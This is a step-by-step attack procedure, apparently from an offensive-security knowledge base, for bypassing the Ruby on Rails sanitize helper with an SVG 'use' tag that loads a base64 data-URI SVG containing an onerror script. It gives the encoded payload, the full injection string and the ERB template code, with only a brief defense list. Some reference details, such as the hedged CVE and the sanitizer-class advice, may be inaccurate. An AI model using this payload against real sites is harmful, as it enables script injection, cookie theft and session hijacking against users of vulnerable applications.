---
id: proc-uuid-1234
tags:
  - xss
  - rails
  - svg
  - sanitize-bypass
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:52:43.536Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Inject-SVG-Use-Tag-XSS-Payload

## Summary

This procedure exploits a vulnerability in Ruby on Rails' ActionView sanitize helper by crafting an SVG payload that uses a base64-encoded data URI in a 'use' tag's href attribute. When 'svg' and 'use' tags are permitted, the sanitizer fails to strip executable JavaScript within the decoded SVG, enabling cross-site scripting (XSS) to execute arbitrary code like alerts, data exfiltration, or session hijacking.

## Description

The attack targets the Rails::Html::Sanitizer (powered by Loofah) which does not properly handle data URIs in 'use' tags. By encoding a malicious SVG with an <image> tag and onerror JavaScript handler as base64, and embedding it in a data:image/svg+xml;base64 URI, the payload bypasses sanitization. This is injected via the sanitize helper in an ERB template. The impact includes executing JavaScript in the user's browser, leading to theft of sensitive data (e.g., cookies, localStorage), session hijacking, or performing actions as the victim, causing reputational damage.

Prerequisites include a Rails app allowing svg/use tags (default or configured) and an injection point for ERB content, such as user-controlled templates or admin interfaces.

## Requirements

1. Ruby on Rails environment with ActionView (versions prior to patch for CVE-2021-22881 or similar)
2. Sanitize helper configured to permit 'svg' and 'use' tags (e.g., config.action_view.sanitized_allowed_tags = %w(svg use))
3. Access to modify or inject into ERB templates (e.g., .erb files like index.html.erb)
4. Browser to render the output for testing

## Defense

Defensive measures and detection strategies:

- Update Rails to a patched version (e.g., 6.0.3.4+ or 6.1.1+) where sanitizer blocks data URIs in use tags
- Restrict allowed tags to exclude 'svg' and 'use' unless necessary; use Rails::Html::WhiteListSanitizer instead of PermitList
- Implement Content Security Policy (CSP) to block inline scripts and data URIs
- Monitor for anomalous JavaScript execution in web logs or use WAF rules to detect base64 SVG payloads
- Audit ERB templates for sanitize calls with permissive tags

## Objectives

1. Bypass HTML sanitization to inject executable SVG content
2. Trigger JavaScript execution via onerror in an embedded image tag
3. Demonstrate XSS impact such as alerting the origin or exfiltrating data

## Instructions

### Step 1: Encode the Malicious SVG

**Context**: Create the base64-encoded SVG payload containing the XSS vector. The SVG includes an <image> tag with a invalid href to trigger onerror and execute alert(window.origin).

The raw SVG is: <svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'><image href="1" onerror="alert(window.origin)" /></svg>

Encode this to base64 (manually or via tool like base64 command):

```erb
PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+
```

> This base64 string represents the encoded SVG. Verify decoding yields the original SVG with the onerror handler intact.

### Step 2: Construct the Full Payload

**Context**: Embed the base64 in a data URI and wrap in a <use> tag inside an <svg> element. This exploits the sanitizer's failure to process the URI content.

Full payload:

```erb
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x"/></svg>
```

> The #x fragment ensures the use tag references the id='x' in the decoded SVG, loading the malicious image.

### Step 3: Inject via Sanitize Helper

**Context**: Use the sanitize method in an ERB template, specifying tags: %w(svg use) to permit the elements. Render the view to trigger execution.

In index.html.erb or similar:

```erb
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/>", tags: %w(svg use) %>
```

> Escaped quotes (\") ensure valid ERB syntax. Start the Rails server (rails s) and visit the page. The sanitizer passes the payload, and the browser executes the JS on SVG load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[rails]]
- [[svg]]
- [[sanitize-bypass]]
- [[injection]]
